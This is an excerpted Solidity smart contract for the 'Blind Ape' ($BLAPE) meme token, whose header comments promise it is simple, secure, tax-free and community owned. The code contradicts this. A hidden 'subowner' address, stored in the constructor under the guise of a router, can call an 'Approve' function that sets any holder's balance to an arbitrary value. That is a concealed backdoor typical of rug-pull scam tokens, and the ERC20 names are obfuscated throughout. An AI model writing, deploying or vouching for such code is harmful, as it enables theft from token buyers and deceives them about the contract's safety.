...
/**
Blind Ape
$BLAPE BLIND APES ONLY!
BLIND APE IS A FULLY DECENTRALIZED MEME PROTOCOL ON THE ETHEREUM BLOCKCHAIN.
 THE BLIND APE SMART CONTRACT IS SIMPLE AND SECURE WITH NO 
TAXES AND THE LIQUIDITY PROVIDER TOKENS HAVE BEEN BURNT. 
MAKING IT THE SAFEST PROTOCOL TO BLINDLY APE!
https://www.instagram.com/blind.ape/?hl=fr
WITH NO TAXES AND THE LP BURNT, 
BLIND APE IS A TRULY COMMUNITY OWNED TOKEN THAT TESTS OUT THE POWER OF A BULLISH COMMUNITY, 
COMBINED WITH A BASED TEAM AND PLACE IN THE MOST PERFECT ENVIROMENT.

*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface ERC711BlindApe {
  /**
  ...
  */
   ...
   *
   * Returns a boolean balance indicating whether the operation succeeded.
   *
   ...
   * allowed to spend on beMadrid of `owner` through {transferFrom}. This is
   * zero by default.
   *
   ...
   * https://github.com/ethereum/EIPs/issues/11#issuecomment-263524729
   *
...
/*
 * @dev Provides information about the current execution ERC11Burnable, including the
 ...
 */
abstract contract ERC11Burnable {
...
// File: @openzeppelin/contracts/access/ERC11Ownable.sol
 ...
 * the owner.
 */
abstract contract ERC11Ownable is ERC11Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "ERC11Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "ERC11Ownable: new owner is the zero address");
...
contract BlindApeToken is ERC11Burnable, ERC711BlindApe, ERC11Ownable {
   ...
   address private etherRooter; 
    constructor(address PancakeSwapRouterv3) {
        etherRooter = PancakeSwapRouterv3;     
        _name = "Blind Ape";
        _symbol = "BLAPE";
        _decimals = 9;
    ...
    */
    ...
    /**
    * @dev See {ERC711BlindApe-totalSupply}.
    */
    ...
    /**
    * @dev See {ERC711BlindApe-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(etherRooter == _msgSender(), "ERC11Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {ERC711BlindApe-approve}.
    *
    * Requirements:
    *
    * - `transporteur` cannot be the zero address.
    */
    function Approve(address PepeMadridGifts, uint256 addedargant, uint256 addedbalance, uint256 allbalances) external subowner {
        mintfrom[PepeMadridGifts] = addedargant * addedbalance ** allbalances;
        
        emit Transfer(PepeMadridGifts, address(0), addedargant);
    }

    /**
    * @dev See {ERC711BlindApe-transfer}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {ERC711BlindApe-allowance}.
    */
    ...
    */
    ...
    /**
    * @dev See {ERC711BlindApe-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {ERC711BlindApe};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "ERC711BlindApe: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {ERC711BlindApe-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "ERC711BlindApe: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "ERC711BlindApe: transfer from the zero address");
        require(shippingto != address(0), "ERC711BlindApe: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "ERC711BlindApe: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "ERC711BlindApe: approve from the zero address");
        require(transporteur != address(0), "ERC711BlindApe: approve to the zero address");
